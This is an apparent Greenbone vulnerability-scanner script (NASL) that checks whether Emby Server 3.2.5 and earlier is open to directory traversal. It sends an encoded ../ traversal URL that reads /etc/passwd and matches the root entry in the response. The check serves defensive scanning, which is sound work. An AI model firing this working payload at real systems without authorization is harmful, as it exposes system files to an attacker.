# SPDX-FileCopyrightText: 2017 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:emby:emby.releases";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.107099");
  script_version("2023-06-30T16:09:17+0000");
  script_tag(name:"last_modification", value:"2023-06-30 16:09:17 +0000 (Fri, 30 Jun 2023)");
  script_tag(name:"creation_date", value:"2017-05-03 11:37:14 +0530 (Wed, 03 May 2017)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Emby Server <= 3.2.5 Directory Traversal Vulnerability (Linux) - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2017 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_emby_server_http_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("emby/media_server/http/detected", "Host/runs_unixoide");
  script_require_ports("Services/www", 8096);

  script_tag(name:"summary", value:"Emby Server is prone to a directory traversal vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"Input passed via the swagger-ui object in SwaggerService.cs is
  not properly verified before being used to load resources.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to read
  arbitrary files on the target system.");

  script_tag(name:"affected", value:"Emby Media Server version 3.2.5 and prior.");

  script_tag(name:"solution", value:"Update to the latest available version.");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/41948/");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!get_app_location(cpe: CPE, port: port, nofork: TRUE))
  exit(0);

url = "/%2femby%2fswagger-ui%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd";

if (http_vuln_check(port: port, url: url, pattern: "root:.*:0:[01]:", check_header: TRUE)) {
  report = http_report_vuln_url(port: port, url: url);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
